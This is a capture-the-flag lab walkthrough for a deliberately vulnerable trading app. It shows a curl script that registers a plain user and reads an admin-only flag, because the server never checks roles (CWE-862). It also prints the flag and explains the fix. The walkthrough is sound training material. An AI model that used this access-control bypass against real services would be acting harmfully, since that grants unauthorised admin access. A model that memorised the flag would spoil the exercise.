# shadyoaks-001 - BugForge Lab Walkthrough

**URL:** https://lab-1784202412221-14wkpd.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** Broken Access Control - Missing Role Check on Admin Endpoint (CWE-862)
**Flag:** `bug{MxxuZWEMMBgPfZbeEve68tdRRYp3UB78}`

---

## Summary

Shady Oaks Financial is a multi-currency stock trading SPA. The admin flag endpoint, `GET /api/admin/flag`, performs no server-side role check at all. Any authenticated user, including a freshly registered account with the default `user` role, receives a `200` with the flag directly. No token forgery, mass assignment, or privilege escalation is required.

## Tech Stack

- Frontend: React (CRA), MUI component library
- Backend: Express (Node.js), JWT auth (`Authorization: Bearer`, HS256)
- Storage: SQLite (inferred from balance/currency fields on register response)

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `POST /api/register` | None | Requires `username`, `email`, and `password` - a request with only `name` returns 400 |
| `POST /api/login` | None | Standard email/password login |
| `GET /api/admin/flag` | Bearer (broken) | Should require `role: admin`, actually accepts any authenticated user |

## Attack Chain

```bash
TARGET="https://lab-1784202412221-14wkpd.labs-app.bugforge.io"

# 1. Register a plain user account
REG=$(curl -s -X POST $TARGET/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","email":"attacker@example.com","password":"Test1234!"}')
TOKEN=$(echo $REG | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Registration response confirms role:"user" - nothing elevated
echo $REG
# {"token":"...","user":{"id":4,"username":"attacker","role":"user", ...}}

# 2. Call the admin flag endpoint with the plain user token
curl -s $TARGET/api/admin/flag -H "Authorization: Bearer $TOKEN"
# {"flag":"bug{MxxuZWEMMBgPfZbeEve68tdRRYp3UB78}"}
```

## Discovery Notes

- The JWT payload decodes to `{"id":4,"username":"attacker","role":"user","iat":...}` - a completely unmodified, honestly-issued token.
- No `alg:none` bypass, no secret cracking, and no mass assignment on `role` at registration were needed - `GET /api/admin/flag` simply never checks the caller's role server-side before returning the flag.

## Dead Ends

None required - the endpoint was open on the first authenticated request.

## Root Causes

- `GET /api/admin/flag` validates that a JWT is present and well-formed but never inspects the `role` claim, so any signed token (regardless of privilege level) passes.
- The correct fix is a middleware check enforcing `req.user.role === 'admin'` before the route handler runs, not just `req.user` existing.

## CWE / OWASP

- **CWE-862**: Missing Authorization
- **OWASP API Security**: API5:2023 - Broken Function Level Authorization
